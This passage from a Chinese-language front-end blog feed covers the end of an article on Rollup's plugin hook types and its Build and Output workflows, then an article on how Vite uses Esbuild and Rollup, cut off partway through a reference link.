module 级别，也就是单文件级别。</strong></li><li>Ouput Hook（官方称为 Output Generation Hook）则主要进行代码的打包，对于代码而言，<strong>操作粒度一般为 chunk 级别（一个 chunk 通常指很多文件打包到一起的产物）</strong></li></ol><p>除了根据构建阶段可以将 Rollup 插件进行分类，根据不同的 Hook 执行方式也会有不同的分类，主要包括 Async、Sync、Parallel、Squential、First 这五种。<br />我们将在 Rollup 中接触各种各样的插件 Hook，但无论哪个 Hook 都离不开这五种执行方式。</p><p><a name="evfr9"></a></p><h5 id="Async-amp-Sync"><a href="#Async-amp-Sync" class="headerlink" title="Async &amp; Sync"></a>Async &amp; Sync</h5><p>Async 和 Sync 钩子函数，两者其实是相对的，分别代表异步和同步的钩子函数，两者最大的区别在于同步钩子里面不能有异步逻辑，而异步钩子可以有。<br><a name="oCmig"></a></p><h5 id="Parallel"><a href="#Parallel" class="headerlink" title="Parallel"></a>Parallel</h5><p>Parallel 指并行的钩子函数。如果有多个插件实现了这个钩子的逻辑，一旦有钩子函数是异步逻辑，则并发执行钩子函数，不会等待当前钩子完成（底层使用 Promise.all）。<br />例如，对于 Build 阶段的 buildStart 钩子，它的执行时机其实是在构建刚开始的时候，各个插件可以在这个钩子当中做一些状态的初始化操作，但其实插件之间的操作并不是相互依赖的，也就是可以并发执行，从而提升构建性能。反之，对于需要<strong>依赖其他插件处理结果</strong>的情况就不适合用 Parallel 钩子了，比如 transform。<br><a name="xzNu4"></a></p><h5 id="Sequential"><a href="#Sequential" class="headerlink" title="Sequential"></a>Sequential</h5><p>Sequential 指串行的钩子函数。这种 Hook 往往适用于插件间处理结果相互依赖的情况，前一个插件 Hook 的返回值作为后续插件的入参，这种情况就需要等待前一个插件执行完 Hook，获得其执行结果，然后才能进行下一个插件相应 Hook 的调用，例如 transform。<br><a name="nBZO5"></a></p><h5 id="First"><a href="#First" class="headerlink" title="First"></a>First</h5><p>如果有多个插件实现了这个 Hook，那么 Hook 将依次运行，直到返回一个非 null 或非 undefined 的值为止。<br />比较典型的 Hook 是 resolveId，一旦有插件的 resolveId 返回了一个路径，将停止执行后续插件的 resolveId 逻辑。</p><hr><p>实际上不同的类型是可以叠加的，Async&#x2F;Sync 可以搭配后面几种类型中的任意一种，比如一个 Hook 既可以是 Async 也可以是 First 类型。<br />接着我们将来具体分析 Rollup 当中的插件工作流程，里面会涉及到具体的一些 Hook，大家可以具体地感受一下。</p><p><a name="Ljjcy"></a></p><h4 id="Build-阶段工作流"><a href="#Build-阶段工作流" class="headerlink" title="Build 阶段工作流"></a>Build 阶段工作流</h4><p>首先，我们来分析 Build 阶段的插件工作流程。</p><p>对于 Build 阶段，插件 Hook 的调用流程如下图所示。每个方块代表了一个 Hook。边框的颜色可以表示 Async 和 Sync 类型，方块的填充颜色可以表示 Parallel、Sequential 和 First 类型。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695041351139-c99603c3-0165-4b87-871b-ab11ee4cf64c.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695041351139-c99603c3-0165-4b87-871b-ab11ee4cf64c.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>接下来一步步分析 Build Hooks 的工作流程：</p><ol><li>首先经历 options 钩子进行配置的转换，得到处理后的配置对象。</li><li>随之 Rollup 会调用 <strong>buildStart</strong> 钩子，正式开始构建流程。</li><li>Rollup 先进入到 <strong>resolveId</strong> 钩子中解析文件路径（从 input 配置指定的入口文件开始）。</li><li>Rollup 通过调用 <strong>load</strong> 钩子加载模块内容（load 中会通过 resolveId 解析后的路径来加载模块内容）。</li><li>紧接着 Rollup 执行所有的 <strong>transform</strong> 钩子来对模块内容进行进行自定义的转换，比如 babel 转译。</li><li>现在 Rollup 拿到最后的模块内容，进行 AST 分析，得到所有的 import 内容，调用 <strong>moduleParsed</strong> 钩子<ol><li>如果是普通的 import，则执行 resolveId 钩子，继续回到步骤 3</li><li>如果是动态 import，则执行 <strong>resolveDynamicImport</strong> 钩子解析路径。如果解析成功，则回到步骤 4 加载模块；否则回到步骤 3 通过 resolveId 解析路径。</li></ol></li><li>直到所有的 import 都解析完毕，Rollup 执行 **buildEnd **钩子，Build 阶段结束。</li></ol><p>:::danger<br>当然，在 Rollup 解析路径的时候，即执行 resolveId 或者 resolveDynamicImport 的时候，有些路径可能会被标记为 external（翻译为排除），也就是说不参加 Rollup 打包过程，这个时候就不会进行 load、transform 等等后续的处理了。<br>:::<br>在流程图最上面，不知道大家有没有注意到 <strong>watchChange</strong> 和 <strong>closeWatcher</strong> 这两个 Hook。<br />这里其实是对应了 rollup 的 watch 模式。当你使用 rollup –watch 指令或者在配置文件配有 watch: true 的属性时，代表开启了 Rollup 的 watch 打包模式。这个时候 Rollup 内部会初始化一个 watcher 对象，当文件内容发生变化时，watcher 对象会自动触发 watchChange 钩子执行并对项目进行重新构建。<br />在当前打包过程结束时，Rollup 会自动清除 watcher 对象调用 <strong>closeWacher</strong> 钩子。</p><blockquote><p><strong>Element-plus 组件库中就使用了 unbuild 插件生成开发时 stub，开发调试用。这样就不用 watch 一直监听文件构建。相当于做了优化。</strong></p></blockquote><p><a name="cEhDr"></a></p><h4 id="Output-阶段工作流"><a href="#Output-阶段工作流" class="headerlink" title="Output 阶段工作流"></a>Output 阶段工作流</h4><p>接下来我们来看看 Output 阶段的插件到底是如何来进行工作的。</p><p>这个阶段的 Hook 相比于 Build 阶段稍微多一些，流程上也更加复杂。</p><blockquote><p>需要注意的是，其中会涉及的 Hook 函数比较多，可能会给你理解整个流程带来一些困扰，因此我会在 Hook 执行的阶段解释其大致的作用和意义，关于具体的使用大家可以去 Rollup 的官网自行查阅，毕竟这里的主线还是分析插件的执行流程，掺杂太多的使用细节反而不易于理解。</p></blockquote><p>下面我结合一张完整的插件流程图具体分析一下：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695042153275-18488e72-d56d-4573-aabb-756e1579f6c2.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695042153275-18488e72-d56d-4573-aabb-756e1579f6c2.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><ol><li>执行所有插件的 <strong>outputOptions</strong> 钩子函数，对 output 配置进行转换。</li><li>执行 <strong>renderStart</strong>，并发执行 renderStart 钩子，正式开始打包。</li><li>并发执行所有插件的 <strong>banner</strong>、<strong>footer</strong>、<strong>intro</strong>、<strong>outro</strong> 钩子（底层用 Promise.all 包裹所有的这四种钩子函数）。这四个钩子功能很简单，就是往打包产物的固定位置（比如头部和尾部）插入一些自定义的内容，比如协议声明内容、项目介绍等等。</li><li>从入口模块开始扫描，针对动态 import 语句执行 **renderDynamicImport **钩子，来自定义动态 import 的内容。</li><li>对每个即将生成的 chunk，执行 **augmentChunkHash **钩子，来决定是否更改 chunk 的哈希值，在 watch 模式下即可能会多次打包的场景下，这个钩子会比较适用。</li><li>如果没有遇到 import.meta 语句，则进入下一步；如果遇到了，则：<ol><li>对于 import.meta.url 语句，调用 <strong>resolveFileUrl</strong> 来自定义 url 解析逻辑</li><li>对于其他 import.meta 属性，则调用 <strong>resolveImportMeta</strong> 来进行自定义的解析</li></ol></li><li>接着 Rollup 会生成所有 chunk 的内容，针对每个 chunk 会依次调用插件的 **renderChunk **方法进行自定义操作，也就是说，在这里时候你可以直接操作打包产物了。</li><li>随后会调用 <strong>generateBundle</strong> 钩子，这个钩子的入参里面会包含所有的打包产物信息，包括 chunk（打包后的代码）、asset（最终的静态资源文件）。你可以在这里删除一些 chunk 或者 asset，最终这些内容将不会作为产物输出。</li><li>前面提到了 rollup.rollup 方法会返回一个 bundle 对象，这个对象是包含 generate 和 write 两个方法的，这两个方法唯一的区别在于后者会将代码写入到磁盘中，同时会触发 <strong>writeBundle</strong> 钩子，传入所有的打包产物信息，包括 chunk 和 asset，和 generateBundle 钩子非常相似。不过值得注意的是，这个钩子执行的时候，产物已经输出了，而 generateBundle 执行的时候产物还并没有输出。顺序如下图所示：<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695042441664-9f0d2d1a-5070-4588-a548-1c74b36b8392.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695042441664-9f0d2d1a-5070-4588-a548-1c74b36b8392.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></li><li>当上述 bundle 的 close 方法被调用时，会触发 **closeBundle **钩子，到这里 Output 阶段正式结束。<blockquote><p>注意，当打包过程中任何阶段出现错误时，都会触发 <strong>renderError</strong> 钩子，然后执行 **closeBundle **钩子结束打包</p></blockquote></li></ol><hr><p>到这里，我们终于梳理完了 Rollup 当中完整的插件工作流程，从一开始在<strong>构建生命周期</strong>中对两大构建阶段的感性认识，到现在<strong>插件工作流</strong>的具体分析，不禁感叹 Rollup 看似简单，实则内部细节繁杂。<br />希望你能对照流程图好好复习几遍，彻底消化这部分的知识点，不仅仅能加深你对 Rollup 插件机制的理解，并且对 Rollup 本身打包原理的掌握也会更上一层楼。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite双引擎架构</title>
      <link href="/2024/03/31/frontend/engineering/vite-shuang-yin-qing-jia-gou/"/>
      <url>/2024/03/31/frontend/engineering/vite-shuang-yin-qing-jia-gou/</url>
      
        <content type="html"><![CDATA[<p>这篇文章我们会将目光集中到 Vite 本身的架构上，一起聊聊它是如何站在巨人的肩膀上实现出来的。<br />所谓的巨人，指的就是 Vite 底层所深度使用的两个构建引擎：**Esbuild **和 <strong>Rollup</strong><br><a name="QrtUw"></a></p><h2 id="Vite-架构图"><a href="#Vite-架构图" class="headerlink" title="Vite 架构图"></a>Vite 架构图</h2><p>很多人对 Vite 的双引擎架构仅仅停留在开发阶段使用 Esbuild，生产环境用 Rollup 的阶段，殊不知，Vite 真正的架构远没有这么简单。</p><p>一图胜千言，这里放一张 Vite 架构图：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027269708-921c48d1-d4ed-4bdb-83c0-8e82c41bedc6.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027269708-921c48d1-d4ed-4bdb-83c0-8e82c41bedc6.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />接下来的内容，会围绕这张架构图展开双引擎的介绍，到时候你会对这份架构图理解得更透彻。</p><p><a name="tjz7y"></a></p><h2 id="Esbuild：性能利器"><a href="#Esbuild：性能利器" class="headerlink" title="Esbuild：性能利器"></a>Esbuild：性能利器</h2><p>必须要承认的是，Esbuild 的确是 Vite 高性能的得力助手，在很多关键的构建阶段让 Vite 获得了相当优异的性能，如果这些阶段用传统的打包器&#x2F;编译器来完成的话，开发体验要下降一大截。</p><p>那么，Esbuild 到底在 Vite 的构建体系中发挥了哪些作用？</p><p><a name="V4bx2"></a></p><h3 id="作为-Bundler-打包工具，进行依赖预构建"><a href="#作为-Bundler-打包工具，进行依赖预构建" class="headerlink" title="作为 Bundler 打包工具，进行依赖预构建"></a>作为 Bundler 打包工具，进行依赖预构建</h3><p>首先是开发阶段的依赖预构建<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027420287-f0b83400-70cd-4efc-9c55-0a5af21e8716.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027420287-f0b83400-70cd-4efc-9c55-0a5af21e8716.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />一般来说，node_modules 依赖的大小动辄几百 MB 甚至上 GB ，会远超项目源代码，相信大家都深有体会。如果这些依赖直接在 Vite 中使用，会出现一系列的问题，这些问题我们在<strong>依赖预构建</strong>的小节已经详细分析过，主要是 ESM 格式的兼容性问题和海量请求的问题。<br />总而言之，对于第三方依赖，需要在应用启动前使用 Esbuild 进行<strong>打包</strong>并且<strong>转换为 ESM 格式</strong>。</p><p><a name="UyLHf"></a></p><h4 id="Esbuild-打包时的缺点"><a href="#Esbuild-打包时的缺点" class="headerlink" title="Esbuild 打包时的缺点"></a>Esbuild 打包时的缺点</h4><p>当然，Esbuild 作为打包工具也有一些缺点：</p><ul><li><strong>不支持降级到 ES5 的代码。</strong>这意味着在低端浏览器代码会跑不起来。</li><li><strong>不支持 const enum 等语法。</strong>这意味着单独使用这些语法在 esbuild 中会直接抛错。</li><li><strong>不提供操作打包产物的接口。</strong>像 Rollup 中灵活处理打包产物的能力（如 renderChunk 钩子），在 Esbuild 当中完全没有。</li><li><strong>不支持自定义 Code Splitting 策略。</strong>传统的 Webpack 和 Rollup 都提供了自定义拆包策略的 API，而 Esbuild 并未提供，从而降级了拆包优化的灵活性。</li><li><strong>不支持对异步懒加载请求（路由懒加载，组件懒加载）自动优化</strong></li></ul><p>尽管 Esbuild 作为一个社区新兴的明星项目，有如此多的局限性，但依然不妨碍 Vite 在<strong>开发阶段</strong>使用它成功启动项目并获得极致的<strong>性能提升</strong>。</p><p>而在<strong>生产环境</strong>处于稳定性考虑当然是采用功能更加丰富、生态更加成熟的 Rollup 作为依赖打包工具了。</p><p><a name="nqQ9z"></a></p><h3 id="作为-TS-和-JSX-编译工具，进行单文件编译"><a href="#作为-TS-和-JSX-编译工具，进行单文件编译" class="headerlink" title="作为 TS 和 JSX 编译工具，进行单文件编译"></a>作为 TS 和 JSX 编译工具，进行单文件编译</h3><p>在依赖预构建阶段， Esbuild 作为 <strong>Bundler</strong> 的角色存在。而在 TS(X)&#x2F;JS(X) 单文件编译上面，Vite 也使用 Esbuild 进行语法转译，也就是将 Esbuild 作为 <strong>Transformer</strong> 来用。</p><p>大家可以在架构图中 Vite Plugin Pipeline 部分注意到<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027883082-640336d6-429c-45a2-aa7e-569d4dd8e636.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695027883082-640336d6-429c-45a2-aa7e-569d4dd8e636.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />也就是说，Esbuild 转译 TS 或者 JSX 的能力通过 Vite 插件提供，这个 Vite 插件在开发环境和生产环境都会执行，因此，我们可以得出下面这个结论：<strong>Vite 已经将 Esbuild 的 Transformer 能力用到了生产环境。</strong></p><blockquote><p>尽管如此，对于低端浏览器场景，Vite 仍然可以做到语法和 Polyfill 安全，参考后续的文章</p></blockquote><p>这部分能力用来<strong>替换原先的 Babel 或者 TSC 的功能</strong>，因为无论是 Babel 还是 TSC 都有性能问题，大家对这两个工具普遍的认知都是: <strong>慢，太慢了</strong>。</p><blockquote><p><strong>所以 Element-plus 组件库打包中未使用 babel 和 tsc，直接使用 Esbuild</strong></p></blockquote><p>当 Vite 使用 Esbuild 做单文件编译之后，提升可以说<strong>相当大</strong>了，我们以一个巨大的 50 多 MB 的纯代码文件为例，来对比 Esbuild、Babel、TSC 包括 SWC 的编译性能：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695028279882-f4c515ea-70ef-4e41-9c85-e6eda48ff980.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695028279882-f4c515ea-70ef-4e41-9c85-e6eda48ff980.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"> 文件时仅仅抹掉了类型相关的代码，暂时没有能力实现类型检查。也因此，在初始化 Vite 工程的构建脚本中，vite build 之前会先执行 tsc 命令，也就是借助 TS 官方的编译器进行类型检查。</p><blockquote><p>当然，要解决类型问题，更推荐大家使用 TS 的编辑器插件。在开发阶段就能早早把问题暴露出来并解决，不至于等到项目要打包上线的时候。</p></blockquote><blockquote><p><strong>Element-plus 组件库打包时，就也手动引入的 TS 官方的编译器进行类型检查，也就是 .d.ts 类型文件的生成过程</strong></p></blockquote><p><a name="T0PxW"></a></p><h3 id="作为压缩工具，进行代码压缩"><a href="#作为压缩工具，进行代码压缩" class="headerlink" title="作为压缩工具，进行代码压缩"></a>作为压缩工具，进行代码压缩</h3><p>从架构图中可以看到，在生产环境中 Esbuild 压缩器通过插件的形式融入到了 Rollup 的打包流程中：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695036576208-0be71885-d732-40f4-a917-98a12aca13f3.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695036576208-0be71885-d732-40f4-a917-98a12aca13f3.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />为什么 Vite 要将 Esbuild 作为生产环境下默认的压缩工具？因为压缩效率实在太高了！</p><p>传统的方式都是使用 Terser 这种 JS 开发的压缩器来实现，在 Webpack 或者 Rollup 中作为一个 Plugin 来完成代码打包后的压缩混淆的工作。<br />但 Terser 其实很慢，主要有 2 个原因：</p><ol><li>压缩这项工作涉及大量 AST 操作，并且在传统的构建流程中，<strong>AST 在各个工具之间无法共享</strong>，比如 Terser 就无法与 Babel 共享同一个 AST，造成了很多重复解析的过程。<strong>（Esbuild 可以复用 AST）</strong></li><li>JS 本身属于解释性 + JIT（即时编译） 的语言，对于压缩这种 CPU 密集型的工作，其性能远远比不上 Golang 这种原生语言。</li></ol><p>因此，Esbuild 这种从头到尾<strong>共享 AST</strong> 以及<strong>原生语言编写</strong>的 Minifier 在性能上能够甩开传统工具的好几十倍。</p><p>对比一下，以下是实际大型库（echarts）的压缩性能测试<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695036736295-9698b095-1b93-4269-a86b-720a193227aa.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695036736295-9698b095-1b93-4269-a86b-720a193227aa.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />压缩一个大小为 3.2 MB 的库，Terser 需要耗费 8798 ms，而 Esbuild 仅仅需要 361 ms，压缩效率较 Terser 提升了二三十倍。<br />并且产物的体积<strong>几乎没有劣化</strong>，因此 Vite 果断将其内置为默认的压缩方案。</p><p><a name="QU3yR"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>总的来说，Vite 将 Esbuild 作为自己的性能利器，将 Esbuild 各个垂直方向的能力（Bundler、Transformer、Minifier）利用的淋漓尽致，给 Vite 的高性能提供了有利的保证。</strong></p><p><a name="ORF5s"></a></p><h2 id="Rollup：构建基石"><a href="#Rollup：构建基石" class="headerlink" title="Rollup：构建基石"></a>Rollup：构建基石</h2><p>Rollup 在 Vite 中的重要性一点也不亚于 Esbuild，它既是 Vite 用作生产环境打包的核心工具，也直接决定了 Vite 插件机制的设计。</p><p><a name="cPRly"></a></p><h3 id="生产环境-Bundle"><a href="#生产环境-Bundle" class="headerlink" title="生产环境 Bundle"></a>生产环境 Bundle</h3><p>虽然 ESM 已经得到众多浏览器的原生支持，但生产环境做到完全 no-bundle 也不行，会有网络性能问题。<br />所以，为了在生产环境中也能取得优秀的产物性能，<strong>Vite 默认选择在生产环境中利用 Rollup 打包，并基于 Rollup 本身成熟的打包能力进行扩展和优化。</strong></p><p><strong>Vite 对 Rollup 的优化</strong>主要包含 3 个方面：</p><ol><li><strong>CSS 代码分割。</strong>如果某个异步模块中引入了一些 CSS 代码，Vite 就会自动将这些 CSS 抽取出来生成单独的文件，提高线上产物的缓存复用率。</li><li><strong>自动预加载。</strong>Vite 会自动为入口 chunk 的依赖自动生成预加载标签 <link rel="modulepreload">，这种适当预加载的做法会让浏览器提前下载好资源，优化页面性能。例如：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 省略其它内容 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 入口 chunk --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">crossorigin</span> <span class="attr">src</span>=<span class="string">&quot;/assets/index.250e0340.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  自动预加载入口 chunk 所依赖的 chunk--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;modulepreload&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/assets/vendor.293dca09.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>异步 Chunk 加载优化。</strong>在异步引入的 Chunk 中，通常会有一些公用的模块，例如现有两个异步引入的 Chunk: A 和 B，而且两者有一个公共依赖 C，如下图。一般情况下，Rollup 打包之后，会先请求 A，然后浏览器在加载 A 的过程中才决定请求和加载 C。<strong>但 Vite 进行优化之后，请求 A 的同时会自动预加载 C</strong>，通过优化 Rollup 产物依赖加载方式节省了不必要的网络开销时间。<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695037201534-1e5ca0fb-cbba-4d73-b47d-5a11ace4a040.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695037201534-1e5ca0fb-cbba-4d73-b47d-5a11ace4a040.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></li></ol><p><a name="PfjVw"></a></p><h3 id="兼容插件机制的生态"><a href="#兼容插件机制的生态" class="headerlink" title="兼容插件机制的生态"></a>兼容插件机制的生态</h3><p>无论是开发阶段还是生产环境，Vite 都根植于 Rollup 的插件机制和生态<br />如下面的架构图所示：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695037387122-4c789c29-33fd-4bef-91c1-3cf505432341.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695037387122-4c789c29-33fd-4bef-91c1-3cf505432341.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"> 的思路，自己实现了一个 Plugin Container，用来模拟 Rollup 调度各个 Vite 插件的执行逻辑，而 Vite 的插件写法完全兼容 Rollup，因此在生产环境中将所有的 Vite 插件传入 Rollup 也没有问题。</p><blockquote><p>但反过来，Rollup 插件却不一定能完全兼容 Vite。不过目前仍然有不少 Rollup 插件可以直接复用到 Vite 中。</p></blockquote><p><a name="be1Dc"></a></p><h2 id="Vite-与-Snowpack-的对比"><a href="#Vite-与-Snowpack-的对比" class="headerlink" title="Vite 与 Snowpack 的对比"></a>Vite 与 Snowpack 的对比</h2><p>Vite 属于人有我优的类型，因为类似的工具之前有 <a href="https://link.juejin.cn/?target=https://www.snowpack.dev/">Snowpack</a>，Vite 诞生之后补齐了作为一个 no-bundle 构建工具的 <strong>Dev Server 能力（如 HMR）</strong>，确实比现有的工具能力更优。</p><p>但更重要的是，Vite 在<strong>社区生态</strong>方面比 Snowpack 更占先天优势。<br />Snowpack 自研了一套插件机制，类似 Rollup 的 Hook 机制，可以看出借鉴了 Rollup 的插件机制，但并不能兼容任何现有的打包工具。如果需要打包，只能调用其它打包工具的 API，自身不提供打包能力。<strong>而 Vite 的做法是从头到尾根植于的 Rollup 的生态，设计了和 Rollup 非常吻合的插件机制</strong>，而 Rollup 作为一个非常成熟的打包方案，从诞生至今已经迭代了六年多的时间，npm 年下载量达到上亿次，产物质量和稳定性都经历过大规模的验证。某种程度上说，这种根植于已有成熟工具的思路也能打消或者降低用户内心的疑虑，更有利于工具的推广和发展。</p><p><a name="QUtdw"></a></p><h2 id="为什么选-Vite"><a href="#为什么选-Vite" class="headerlink" title="为什么选 Vite"></a>为什么选 Vite</h2><p>参考：<a href="https://cn.vitejs.dev/guide/why.html">Vite</a><br><a name="Nby5o"></a></p><h2 id="为什么生产环境仍需打包"><a href="#为什么生产环境仍需打包" class="headerlink" title="为什么生产环境仍需打包"></a>为什么生产环境仍需打包</h2><p>尽管原生 ESM 现在得到了广泛支持，但由于嵌套导入会导致额外的网络往返，在生产环境中发布未打包的 ESM 仍然效率低下（即使使用 HTTP&#x2F;2）。<br />为了在生产环境中获得最佳的加载性能，最好还是将代码进行 <strong>tree-shaking</strong>、<strong>懒加载</strong>和 <strong>chunk 分割</strong>（<strong>以获得更好的缓存</strong>）。</p><blockquote><p>要确保开发服务器和生产环境构建之间的最优输出和行为一致并不容易。所以 Vite 附带了一套 <a href="https://cn.vitejs.dev/guide/features.html#build-optimizations">构建优化</a> 的 <a href="https://cn.vitejs.dev/guide/build.html">构建命令</a>，开箱即用。</p></blockquote><p><a name="fWkes"></a></p><h2 id="为什么不用-Esbuild-打包"><a href="#为什么不用-Esbuild-打包" class="headerlink" title="为什么不用 Esbuild 打包"></a>为什么不用 Esbuild 打包</h2><p>参考以上 Esbuild 打包时的缺点：</p><ul><li><strong>不支持降级到 ES5 的代码。</strong>这意味着在低端浏览器代码会跑不起来。</li><li><strong>不支持 const enum 等语法。</strong>这意味着单独使用这些语法在 esbuild 中会直接抛错。</li><li><strong>不提供操作打包产物的接口。</strong>像 Rollup 中灵活处理打包产物的能力（如 renderChunk 钩子），在 Esbuild 当中完全没有。</li><li><strong>不支持自定义 Code Splitting 策略。</strong>传统的 Webpack 和 Rollup 都提供了自定义拆包策略的 API，而 Esbuild 并未提供，从而降级了拆包优化的灵活性。</li><li><strong>不支持对异步懒加载请求（路由懒加载，组件懒加载）自动优化</strong></li></ul><p>并且，与 Rollup 生态不兼容。</p><blockquote><p>Vite 目前的插件 API 与使用 esbuild 作为打包器并不兼容。尽管 esbuild 速度更快，但 Vite 采用了 Rollup 灵活的插件 API 和基础建设，这对 Vite 在生态中的成功起到了重要作用。目前来看，我们认为 Rollup 提供了更好的性能与灵活性方面的权衡。</p></blockquote><p>但是，在 v3 版本下，Vite 允许在构建阶段使用 esbuild 进行依赖优化。如果开启此项，那么它将消除 v2 版本中存在的最明显的开发与构建最终产物之间的区别。</p><p>参考：<a href="https://cn.vitejs.dev/guide/migration-from-v2.html#%E5%9C%A8%E6%9E%84%E5%BB%BA%E9%98%B6%E6%AE%B5%E4%BD%BF%E7%94%A8-esbuild-%E4%BE%9D%E8%B5%96%E4%BC%98%E5%8C%96">在构建阶段使用 esbuild 